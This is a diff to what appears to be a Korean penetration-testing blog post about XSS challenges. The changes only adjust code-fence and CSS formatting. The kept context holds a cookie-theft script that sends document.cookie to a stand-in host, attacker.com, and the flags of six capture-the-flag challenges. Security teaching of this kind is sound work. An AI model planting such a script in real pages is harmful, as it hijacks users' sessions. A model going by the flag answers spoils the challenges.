@@ -13,7 +13,7 @@ categories: 모의 해킹
 
 대표적인 공격 중 하나로 쿠키 정보를 탈취하여 세션 ID를 확보하는 방식이 있다. 다음의 예시 스크립트를 살펴 보자.
 
-```javascript
+```js
 var cookieData = document.cookie;
 var img = new Image();
 img.src = "http://attacker.com/?cookie=" + cookieData;
@@ -163,7 +163,7 @@ HTML 인코딩은 간단하고 효과적인 XSS 방어 기법이지만, 상황�
 
 <img src="/data/Penetration%20Testing%20%7C%20Week%2010/11.png" alt="XSS 1" style="padding: 0 150px; background-color: white">
 
-<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">StoredSavedXSS</span>}</span></p>
+<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">StoredSavedXSS</span>}</span></p>
 
 <br>
 
@@ -200,7 +200,7 @@ img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://
 
 <img src="/data/Penetration%20Testing%20%7C%20Week%2010/17.png" alt="XSS 2" style="padding: 0 150px; background-color: white">
 
-<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">refrefrefXSS</span>}</span></p>
+<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">refrefrefXSS</span>}</span></p>
 
 <br>
 
@@ -239,7 +239,7 @@ img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://
 
 <img src="/data/Penetration%20Testing%20%7C%20Week%2010/23.png" alt="XSS 3" style="padding: 0 150px; background-color: white">
 
-<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">myPageReflected</span>}</span></p>
+<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">myPageReflected</span>}</span></p>
 
 <br>
 
@@ -265,7 +265,7 @@ img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://
 
 <img src="/data/Penetration%20Testing%20%7C%20Week%2010/28.png" alt="XSS 4" style="padding: 0 150px; background-color: white">
 
-<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">blAckFiltering</span>}</span></p>
+<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">blAckFiltering</span>}</span></p>
 
 <br>
 
@@ -289,7 +289,7 @@ img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://
 
 <img src="/data/Penetration%20Testing%20%7C%20Week%2010/33.png" alt="XSS 5" style="padding: 0 150px; background-color: white">
 
-<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">ClientCheckNone</span>}</span></p>
+<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">ClientCheckNone</span>}</span></p>
 
 <br>
 
@@ -342,4 +342,4 @@ img.<span class="hljs-property">src</span> = <span class="hljs-string">"https://
 
 <img src="/data/Penetration%20Testing%20%7C%20Week%2010/40.png" alt="XSS 6" style="padding: 0 150px; background-color: white">
 
-<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px);">keyLogger</span>}</span></p>
+<p style="text-align: center;">Flag: <span style="color: green">segfault{<span style="filter: blur(5px); overflow-wrap:anywhere;">keyLogger</span>}</span></p>
